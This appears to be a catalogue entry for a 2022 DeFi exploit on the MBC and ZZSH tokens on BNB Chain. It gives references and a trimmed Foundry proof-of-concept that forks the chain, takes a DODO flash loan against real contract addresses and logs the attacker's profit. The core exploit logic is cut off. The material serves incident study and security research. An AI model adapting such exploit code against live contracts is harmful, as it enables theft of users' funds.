# [?] - MBC & ZZSH - Business Logic Flaw & Access Control

## Summary
Severity: Unknown
Chain: BNB Chain
Component: MBC_ZZSH
Published: 2022-11-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/MBC_ZZSH_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://twitter.com/AnciliaInc/status/1597742575623888896
- https://twitter.com/CertiKAlert/status/1597639717096460288
- https://phalcon.blocksec.com/tx/bsc/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86

```solidity
contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IMBC MBC = IMBC(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    IZZSH ZZSH = IZZSH(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 MBCPair = Uni_Pair_V2(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);
    Uni_Pair_V2 ZZSHPair = Uni_Pair_V2(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 dodoFlahloanAmount;

    function setUp() public {
        cheats.createSelectFork("bsc", 23_474_460);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        MBC.approve(address(Router), type(uint256).max);
        ZZSH.approve(address(Router), type(uint256).max);
        dodoFlahloanAmount = USDT.balanceOf(dodo);
        DVM(dodo).flashLoan(0, dodoFlahloanAmount, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // Intial rate MBC/USDT -> 1.1365032200116891/1
        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/MBC_ZZSH_exp.sol_
